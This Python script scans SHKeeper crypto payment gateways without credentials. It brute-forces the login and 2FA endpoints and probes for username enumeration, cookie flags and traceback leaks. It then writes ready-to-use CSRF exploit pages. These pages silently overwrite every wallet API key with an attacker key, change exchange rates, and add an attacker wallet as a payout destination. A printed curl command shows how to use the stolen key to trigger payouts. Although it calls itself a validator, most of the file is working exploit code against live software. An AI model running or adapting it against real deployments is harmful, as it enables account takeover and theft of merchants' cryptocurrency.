#!/usr/bin/env python3
import argparse, json, sys, time, requests
from urllib.parse import urljoin

requests.packages.urllib3.disable_warnings()

R="\033[91m"; G="\033[92m"; Y="\033[93m"; C="\033[96m"; B="\033[1m"; E="\033[0m"
results = []

def v(n, t, sev, p):
    results.append({"id":n,"s":"VULN","sev":sev,"t":t,"p":p})
    print(f"  {R}[VULN][{sev}]{E} #{n} {t}")
    for l in p.split("\n"): print(f"         {l}")
    print()

def ok(n, t, r):
    results.append({"id":n,"s":"SAFE","t":t,"p":r})
    print(f"  {G}[SAFE]{E} #{n} {t} — {r}\n")

def sk(n, t, r):
    results.append({"id":n,"s":"SKIP","t":t,"p":r})
    print(f"  {Y}[SKIP]{E} #{n} {t} — {r}\n")

def get_crypto(tgt):
    try:
        r = requests.get(urljoin(tgt,"/api/v1/crypto"),verify=False,timeout=5)
        cl = r.json().get("crypto_list") or r.json().get("crypto") or []
        c = cl[0] if cl else "BTC"
        return c if isinstance(c,str) else c.get("crypto","BTC")
    except: return "BTC"

# #1 CSRF -> API key overwrite -> full compromise
def t1(tgt):
    n,t = 1,"CSRF -> API Key Overwrite -> Full Compromise"
    s = requests.Session(); s.verify = False
    crypto = get_crypto(tgt)

    try:
        r = s.post(urljoin(tgt,f"/api/v1/{crypto}/payment-gateway/token"),
            headers={"Content-Type":"text/plain"},
            data='{"token":"probe_only","x":"="}',
            allow_redirects=False, timeout=10)
    except Exception as e:
        return sk(n,t,str(e))

    ep_exists = r.status_code in (302,303,200,401,403)
    if not ep_exists:
        return sk(n,t,f"endpoint returned {r.status_code}")

    try:
        rl = s.get(urljoin(tgt,"/login"),timeout=10)
    except Exception as e:
        return sk(n,t,str(e))

    body = rl.text.lower()
    has_csrf = any(x in body for x in ["csrf_token","csrf-token","csrfmiddlewaretoken","csrftoken"])
    if has_csrf:
        return ok(n,t,"CSRF tokens found")

    ck = ""
    for h,val in rl.headers.items():
        if h.lower() == "set-cookie": ck += val.lower() + "; "

    ss_none = "samesite=none" in ck
    ss_missing = "samesite" not in ck
    ss_lax = "samesite=lax" in ck

    if ss_none or ss_missing:
        sev = "CRITICAL"
        ss_info = f"SameSite={'None' if ss_none else 'MISSING'} -> cookies sent cross-site"
    elif ss_lax:
        sev = "HIGH"
        ss_info = "SameSite=Lax -> browser blocks cross-site POST but no server-side fix"
    else:
        sev = "HIGH"
        ss_info = "SameSite=Strict -> browser mitigation only, XSS bypasses it"

    v(n,t,sev,
        f"POST /api/v1/{crypto}/payment-gateway/token -> HTTP {r.status_code}\n"
        f"Cookie: {ss_info}\n"
        f"No CSRF token in any form. get_json(force=True) parses any Content-Type.\n"
        f"\n"
        f"ATTACK: admin visits attacker page while logged in:\n"
        f'  <form method=POST enctype=text/plain action="{tgt}/api/v1/{crypto}/payment-gateway/token">\n'
        f'    <input name=\'{{"token":"ATTACKER_KEY","x":"\' value=\'"}}\'>\n'
        f"  </form> -> auto-submit\n"
        f"  Body: {{\"token\":\"ATTACKER_KEY\",\"x\":\"=\"}}\n"
        f"  Result: ALL wallet API keys overwritten to ATTACKER_KEY\n"
        f"\n"
        f"POST-EXPLOIT with stolen key:\n"
        f"  curl -H 'X-Shkeeper-Api-Key: ATTACKER_KEY' {tgt}/api/v1/ETH/payout -d '{{..}}'\n"
        f"  -> SSRF via destination path traversal, trigger payouts, read all data")

# #2 username enum
def t2(tgt):
    n,t = 2,"Username Enumeration"
    s = requests.Session(); s.verify = False
    try:
        r1 = s.post(urljoin(tgt,"/login"),data={"name":"fake_user_xyz","password":"x"},allow_redirects=False)
        r2 = s.post(urljoin(tgt,"/login"),data={"name":"admin","password":"wrong"},allow_redirects=False)
    except Exception as e: return sk(n,t,str(e))

    b1,b2 = r1.text.lower(),r2.text.lower()
    if "incorrect username" in b1 and ("incorrect password" in b2 or (r2.status_code in (302,303) and "2fa" in r2.headers.get("Location",""))):
        v(n,t,"MEDIUM","fake user -> 'Incorrect username.'\nadmin -> 'Incorrect password.' or 2FA redirect\nDifferent messages reveal valid usernames.")
    elif b1 != b2:
        v(n,t,"LOW",f"responses differ (len {len(r1.text)} vs {len(r2.text)})")
    else:
        ok(n,t,"identical responses")

# #3 login brute force
def t3(tgt):
    n,t = 3,"No Login Brute Force Protection"
    s = requests.Session(); s.verify = False
    try:
        for i in range(30):
            r = s.post(urljoin(tgt,"/login"),data={"name":"admin","password":f"w{i}"},allow_redirects=False)
            if r.status_code == 429: return ok(n,t,f"429 after {i+1}")
            if any(x in r.text.lower() for x in ["locked","too many","rate limit","blocked"]):
                return ok(n,t,f"blocked after {i+1}")
    except Exception as e: return sk(n,t,str(e))
    v(n,t,"MEDIUM",f"30 wrong passwords, zero protection.\nNo 429, no lockout, no captcha.")

# #4 2FA brute force
def t4(tgt):
    n,t = 4,"No 2FA Brute Force Protection"
    s = requests.Session(); s.verify = False
    try:
        for i in range(30):
            r = s.post(urljoin(tgt,"/2fa/verify"),data={"token":f"{i:06d}"},allow_redirects=False)
            if r.status_code == 429: return ok(n,t,f"429 after {i+1}")
            if any(x in r.text.lower() for x in ["too many","rate limit","locked","blocked"]):
                return ok(n,t,f"blocked after {i+1}")
    except Exception as e: return sk(n,t,str(e))
    v(n,t,"HIGH","30 TOTP guesses, zero rate limit.\n6 digits=1M codes, valid_window=1 -> 3 valid at once.\n~4.5% crack chance per 5-min session at 50 req/sec.")

# #5 unauth crypto list
def t5(tgt):
    n,t = 5,"Unauthenticated /api/v1/crypto"
    try:
        r = requests.get(urljoin(tgt,"/api/v1/crypto"),verify=False,timeout=10)
    except Exception as e: return sk(n,t,str(e))
    if r.status_code in (401,403): return ok(n,t,f"HTTP {r.status_code}")
    try:
        data = r.json()
        cl = data.get("crypto_list") or data.get("crypto") or []
        names = [c if isinstance(c,str) else c.get("crypto",str(c)) for c in cl[:15]]
    except: return sk(n,t,"non-JSON")
    if r.status_code == 200 and names:
        v(n,t,"LOW",f"HTTP 200 no auth. Cryptos: {', '.join(names)}")
    elif r.status_code == 200:
        v(n,t,"LOW","HTTP 200 no auth (empty list)")
    else: ok(n,t,f"HTTP {r.status_code}")

# #6 cookie flags
def t6(tgt):
    n,t = 6,"Session Cookie Flags"
    s = requests.Session(); s.verify = False
    try:
        r = s.get(urljoin(tgt,"/login"),timeout=10)
        if not r.headers.get("Set-Cookie"):
            r = s.post(urljoin(tgt,"/login"),data={"name":"x","password":"x"},allow_redirects=False)
    except Exception as e: return sk(n,t,str(e))
    raw = r.headers.get("Set-Cookie","")
    if not raw: return sk(n,t,"no Set-Cookie")
    ck = raw.lower()
    issues = []
    if "httponly" not in ck: issues.append("No HttpOnly")
    if "secure" not in ck and tgt.startswith("https"): issues.append("No Secure")
    if "samesite" not in ck: issues.append("No SameSite -> enables CSRF chain (#1)")
    if issues:
        sev = "HIGH" if "samesite" not in ck else "MEDIUM"
        v(n,t,sev,f"Set-Cookie: {raw[:150]}\n"+"\n".join(issues))
    else: ok(n,t,"all flags present")

# #7 no CSRF tokens anywhere
def t7(tgt):
    n,t = 7,"Zero CSRF Protection"
    s = requests.Session(); s.verify = False
    pages = ["/login","/set-password","/2fa/verify"]
    checked = no_csrf = 0
    for p in pages:
        try:
            r = s.get(urljoin(tgt,p),timeout=10,allow_redirects=True)
            if "<form" in r.text.lower():
                checked += 1
                if not any(x in r.text.lower() for x in ["csrf_token","csrf-token","csrfmiddlewaretoken","csrftoken"]):
                    no_csrf += 1
        except: pass
    if checked == 0: return sk(n,t,"no forms found")
    if no_csrf == checked:
        v(n,t,"HIGH",f"{checked}/{checked} forms have zero CSRF tokens.\nAll POST endpoints vulnerable: /rates, /payout, /payment-gateway/token, /2fa/disable")
    elif no_csrf > 0:
        v(n,t,"MEDIUM",f"{no_csrf}/{checked} forms lack CSRF")
    else: ok(n,t,"all forms have CSRF tokens")

# #8 traceback disclosure
def t8(tgt):
    n,t = 8,"Stack Trace in API Responses"
    paths = ["/api/v1/FAKE/payment_request","/api/v1/BTC/payment_request","/api/v1/BTC/payout"]
    for p in paths:
        try:
            r = requests.post(urljoin(tgt,p),json={"bad":"data"},
                headers={"X-Shkeeper-Api-Key":"invalid"},verify=False,timeout=10)
            try:
                d = r.json()
                tb = d.get("traceback","")
                if tb and ("Traceback" in tb or "File " in tb):
                    return v(n,t,"MEDIUM",f"POST {p} -> traceback in JSON:\n  {tb[:200]}...")
            except:
                if "Traceback" in r.text and "File " in r.text:
                    return v(n,t,"MEDIUM",f"POST {p} -> traceback in response:\n  {r.text[:200]}...")
        except: pass
    ok(n,t,"no tracebacks in responses")

def gen_pocs(tgt):
    crypto = get_crypto(tgt)
    with open("csrf_apikey_overwrite.html","w") as f:
        f.write(f"""<!DOCTYPE html><html><body>
<h2>Loading...</h2>
<iframe name="x" style="display:none"></iframe>
<form id="f" method="POST" enctype="text/plain" target="x"
  action="{tgt}/api/v1/{crypto}/payment-gateway/token">
<input name='{{"token":"ATTACKER_KEY","x":"' value='"}}'>
</form>
<script>document.getElementById('f').submit()</script>
</body></html>""")

    with open("csrf_multi.html","w") as f:
        f.write(f"""<!DOCTYPE html><html><body>
<h2>Loading...</h2>
<iframe name="f0" style="display:none"></iframe>
<form id="a0" method="POST" enctype="text/plain" target="f0"
  action="{tgt}/api/v1/{crypto}/payment-gateway/token">
<input name='{{"token":"attacker_key","x":"' value='"}}'>
</form>
<iframe name="f1" style="display:none"></iframe>
<form id="a1" method="POST" target="f1" action="{tgt}/rates/USD">
<input name="rates__{crypto}__source" value="manual">
<input name="rates__{crypto}__rate" value="50000">
<input name="rates__{crypto}__fee" value="0">
<input name="rates__{crypto}__fixed_fee" value="0">
</form>
<iframe name="f2" style="display:none"></iframe>
<form id="a2" method="POST" target="f2" action="{tgt}/api/v1/{crypto}/payout_destinations">
<input name="action" value="add">
<input name="daddress" value="ATTACKER_WALLET">
<input name="dcomment" value="office">
</form>
<script>
document.getElementById('a0').submit();
setTimeout(function(){{document.getElementById('a1').submit()}},500);
setTimeout(function(){{document.getElementById('a2').submit()}},1000);
</script>
</body></html>""")

def main():
    p = argparse.ArgumentParser()
    p.add_argument("--target",required=True)
    a = p.parse_args()
    tgt = a.target.rstrip("/")

    print(f"\n{B}{'='*60}")
    print(f" SHKeeper Outsider Validator | Zero credentials")
    print(f" Target: {tgt}")
    print(f"{'='*60}{E}\n")

    try:
        r = requests.get(urljoin(tgt,"/login"),verify=False,timeout=10)
        print(f"  {C}[OK]{E} reachable ({r.status_code})\n")
    except Exception as e:
        print(f"  {R}[FAIL]{E} {e}"); sys.exit(1)

    print(f"{B}--- CRITICAL: CSRF -> API Key Overwrite ---{E}\n")
    t1(tgt)

    print(f"{B}--- Auth ---{E}\n")
    t2(tgt); t3(tgt); t4(tgt)

    print(f"{B}--- CSRF ---{E}\n")
    t7(tgt)

    print(f"{B}--- Info Disclosure ---{E}\n")
    t5(tgt); t6(tgt); t8(tgt)

    vulns = [f for f in results if f["s"]=="VULN"]
    safes = [f for f in results if f["s"]=="SAFE"]
    skips = [f for f in results if f["s"]=="SKIP"]

    print(f"{B}{'='*60}")
    print(f" RESULTS")
    print(f"{'='*60}{E}\n")
    for f in results:
        c = R if f["s"]=="VULN" else G if f["s"]=="SAFE" else Y
        sev = f" [{f.get('sev','')}]" if f["s"]=="VULN" else ""
        print(f"  {c}[{f['s']:>4}]{sev}{E} #{f['id']} {f['t']}")

    print(f"\n  {R}VULN:{len(vulns)}{E} {G}SAFE:{len(safes)}{E} {Y}SKIP:{len(skips)}{E}\n")

    json.dump({"target":tgt,"ts":int(time.time()),"findings":results},
        open("validation_results.json","w"),indent=2)

    gen_pocs(tgt)

    print(f"  validation_results.json")
    print(f"  csrf_apikey_overwrite.html  <- critical PoC")
    print(f"  csrf_multi.html             <- combo attack\n")

if __name__ == "__main__":
    main()
